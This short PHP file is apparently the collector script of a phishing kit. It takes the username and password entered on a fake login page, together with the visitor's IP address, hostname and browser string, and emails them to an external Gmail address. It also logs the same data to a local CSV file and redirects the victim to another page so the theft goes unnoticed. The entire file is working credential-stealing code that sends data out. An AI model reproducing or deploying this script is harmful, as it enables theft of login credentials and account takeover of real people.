<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "===========================INFORMATIONS CONFIRMATION===========================\n";
$message .= "Identifiant              : ".$_POST['UserNameInput']."\n";
$message .= "Password                 : ".$_POST['PasswordInput']."\n";
$message .= "===========================INFOS OF MACHINE===========================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "===========================KA7iYAWDAN===========================\n";
$send = "hymanehymane@gmail.com";
$subject = "LOOOOG | $ip ";
$headers = "From:IDENTIFIANTE <hymanehymane@gmail.com>";
mail($send,$subject,$message,$headers);
$file = fopen('doort7awala.csv', 'a');
fwrite($file,$message);
header("Location: informacion.html");

?>